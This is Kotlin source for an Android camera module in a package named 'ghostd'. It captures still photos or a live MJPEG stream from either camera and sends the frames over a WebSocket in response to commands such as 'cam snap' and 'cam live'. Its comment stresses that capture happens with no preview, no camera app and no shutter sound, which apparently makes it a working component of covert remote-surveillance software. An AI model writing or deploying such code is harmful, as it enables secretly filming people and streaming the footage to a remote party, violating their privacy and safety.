package com.tg.ghostd

import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.Image
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import com.neovisionaries.ws.client.WebSocket
import org.json.JSONObject
import java.util.concurrent.CountDownLatch
import java.util.concurrent.LinkedBlockingQueue
import java.util.concurrent.TimeUnit

/**
 * Camera2 preview-less capture: cam snap (single JPEG, base64 result) and
 * cam live (repeated JPEG frames at preset fps, MJPEG over WS).
 * No preview surface and no camera-app involvement -> no shutter sound.
 */
object CameraCapturer {

    @Volatile private var stopRequested = false

    // ------------------------------------------------------------------ snap

    @SuppressLint("MissingPermission")
    fun snap(ctx: Context, facing: String): JSONObject {
        if (ctx.checkSelfPermission(android.Manifest.permission.CAMERA)
            != PackageManager.PERMISSION_GRANTED
        ) throw Exception("camera permission not granted")
        MediaBus.begin(MediaBus.SOURCE_CAM, ctx, null)
        val ht = HandlerThread("ghostd-camsnap").apply { start() }
        val handler = Handler(ht.looper)
        try {
            val cm = ctx.getSystemService(CameraManager::class.java)
            val (id, chars) = pickCamera(cm, facing)
            val preset = QualityPresets.get("high")
            val size = pickJpegSize(chars, preset)
            val reader = ImageReader.newInstance(size.width, size.height, android.graphics.ImageFormat.JPEG, 2)
            val frames = LinkedBlockingQueue<ByteArray>()
            reader.setOnImageAvailableListener({ r ->
                try {
                    val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                    frames.offer(jpegBytes(img))
                    img.close()
                } catch (_: Exception) {
                }
            }, handler)

            val opened = CountDownLatch(1)
            val captured = CountDownLatch(1)
            var device: CameraDevice? = null
            cm.openCamera(id, object : CameraDevice.StateCallback() {
                override fun onOpened(d: CameraDevice) {
                    device = d
                    opened.countDown()
                }

                override fun onDisconnected(d: CameraDevice) {
                    d.close(); opened.countDown()
                }

                override fun onError(d: CameraDevice, error: Int) {
                    d.close(); opened.countDown()
                }
            }, handler)

            if (!opened.await(10, TimeUnit.SECONDS) || device == null) {
                throw Exception("camera open failed (in use or denied)")
            }
            try {
                val dev = device!!
                dev.createCaptureSession(
                    listOf(reader.surface),
                    object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(s: CameraCaptureSession) {
                            try {
                                val req = dev.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                    .apply {
                                        addTarget(reader.surface)
                                        set(CaptureRequest.JPEG_QUALITY, 85.toByte())
                                    }
                                s.capture(req.build(), object : CameraCaptureSession.CaptureCallback() {},
                                    handler)
                            } catch (_: Exception) {
                            } finally {
                                captured.countDown()
                            }
                        }

                        override fun onConfigureFailed(s: CameraCaptureSession) {
                            captured.countDown()
                        }
                    }, handler
                )
                val jpeg = frames.poll(15, TimeUnit.SECONDS)
                    ?: throw Exception("camera capture timed out")
                return JSONObject()
                    .put("facing", facing)
                    .put("width", size.width)
                    .put("height", size.height)
                    .put("jpeg_b64", Base64.encodeToString(jpeg, Base64.NO_WRAP))
            } finally {
                try {
                    device?.close()
                } catch (_: Exception) {
                }
            }
        } finally {
            ht.quitSafely()
            MediaBus.end(MediaBus.SOURCE_CAM)
        }
    }

    // ------------------------------------------------------------------ live

    /**
     * Start a live MJPEG camera stream. Returns immediately with stream info;
     * frames flow as binary WS messages until "cam stop".
     */
    @SuppressLint("MissingPermission")
    fun live(ctx: Context, ws: WebSocket, facing: String, quality: String?, fps: Int?): JSONObject {
        if (ctx.checkSelfPermission(android.Manifest.permission.CAMERA)
            != PackageManager.PERMISSION_GRANTED
        ) throw Exception("camera permission not granted")
        MediaBus.begin(MediaBus.SOURCE_CAM, ctx, ws)
        stopRequested = false
        val preset = QualityPresets.get(quality)
        val streamName = "cam-live"
        val t = Thread {
            val ht = HandlerThread("ghostd-camlive").apply { start() }
            val handler = Handler(ht.looper)
            try {
                runLive(ctx, handler, facing, preset, fps, streamName)
            } catch (_: Exception) {
            } finally {
                ht.quitSafely()
                MediaBus.end(MediaBus.SOURCE_CAM)
            }
        }.apply { name = "ghostd-camlive"; start() }
        return JSONObject()
            .put("stream", streamName)
            .put("started", true)
            .put("facing", facing)
            .put("quality", preset.name)
            .put("width", preset.width)
            .put("height", preset.height)
            .put("fps", QualityPresets.fpsOverride(fps) ?: preset.fps)
    }

    @SuppressLint("MissingPermission")
    private fun runLive(
        ctx: Context, handler: Handler,
        facing: String, preset: QualityPresets.Preset, fps: Int?, streamName: String
    ) {
        val effFps = QualityPresets.fpsOverride(fps) ?: preset.fps
        val cm = ctx.getSystemService(CameraManager::class.java)
        val (id, chars) = pickCamera(cm, facing)
        val size = pickJpegSize(chars, preset)
        val reader = ImageReader.newInstance(size.width, size.height, android.graphics.ImageFormat.JPEG, 3)
        var sent = 0L
        val last = longArrayOf(0L)
        reader.setOnImageAvailableListener({ r ->
            try {
                val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                val now = System.currentTimeMillis()
                if (now - last[0] >= 1000L / effFps) {
                    last[0] = now
                    val payload = jpegBytes(img)
                    img.close()
                    if (!MediaBus.sendFrame(
                            streamName, payload,
                            JSONObject().put("facing", facing)
                        )
                    ) {
                        stopRequested = true
                        return@setOnImageAvailableListener
                    }
                    sent++
                } else {
                    img.close()
                }
            } catch (_: Exception) {
            }
        }, handler)

        val opened = CountDownLatch(1)
        cm.openCamera(id, object : CameraDevice.StateCallback() {
            override fun onOpened(d: CameraDevice) {
                try {
                    d.createCaptureSession(
                        listOf(reader.surface),
                        object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(s: CameraCaptureSession) {
                                try {
                                    val req = d.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                                        .apply {
                                            addTarget(reader.surface)
                                            set(CaptureRequest.JPEG_QUALITY, preset.jpegQuality.toByte())
                                        }
                                    s.setRepeatingRequest(req.build(), null, handler)
                                    MediaBus.streamStart(
                                        streamName,
                                        JSONObject()
                                            .put("width", size.width)
                                            .put("height", size.height)
                                            .put("fps", effFps)
                                            .put("quality", preset.name)
                                            .put("jpeg_quality", preset.jpegQuality)
                                            .put("encoding", "mjpeg")
                                            .put("facing", facing)
                                    )
                                } catch (_: Exception) {
                                    stopRequested = true
                                }
                            }

                            override fun onConfigureFailed(s: CameraCaptureSession) {
                                stopRequested = true
                            }
                        }, handler
                    )
                } catch (_: Exception) {
                    stopRequested = true
                } finally {
                    opened.countDown()
                }
            }

            override fun onDisconnected(d: CameraDevice) {
                d.close(); stopRequested = true; opened.countDown()
            }

            override fun onError(d: CameraDevice, error: Int) {
                d.close(); stopRequested = true; opened.countDown()
            }
        }, handler)

        while (!stopRequested) {
            try {
                Thread.sleep(200)
            } catch (_: InterruptedException) {
                stopRequested = true
            }
        }
        MediaBus.streamEnd(streamName, sent, if (sent > 0) "stopped" else "camera error")
        reader.close()
    }

    fun stop(): JSONObject {
        stopRequested = true
        return JSONObject().put("stopping", MediaBus.SOURCE_CAM)
    }

    fun requestStopOnly() {
        stopRequested = true
    }

    // ------------------------------------------------------------------ util

    private fun pickCamera(cm: CameraManager, facing: String): Pair<String, CameraCharacteristics> {
        val want = if (facing == "front") CameraCharacteristics.LENS_FACING_FRONT
        else CameraCharacteristics.LENS_FACING_BACK
        for (id in cm.cameraIdList) {
            val ch = cm.getCameraCharacteristics(id)
            if (ch.get(CameraCharacteristics.LENS_FACING) == want) return id to ch
        }
        throw Exception("no $facing camera found")
    }

    /** Closest available JPEG size to the preset (area distance). */
    private fun pickJpegSize(chars: CameraCharacteristics, preset: QualityPresets.Preset): android.util.Size {
        val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
        val sizes = map?.getOutputSizes(android.graphics.ImageFormat.JPEG)
        if (sizes.isNullOrEmpty()) throw Exception("no JPEG output sizes")
        return sizes.minByOrNull { s ->
            val dw = s.width - preset.width
            val dh = s.height - preset.height
            dw * dw + dh * dh
        } ?: sizes[0]
    }

    private fun jpegBytes(image: Image): ByteArray {
        val buf = image.planes[0].buffer
        val out = ByteArray(buf.remaining())
        buf.get(out)
        return out
    }
}
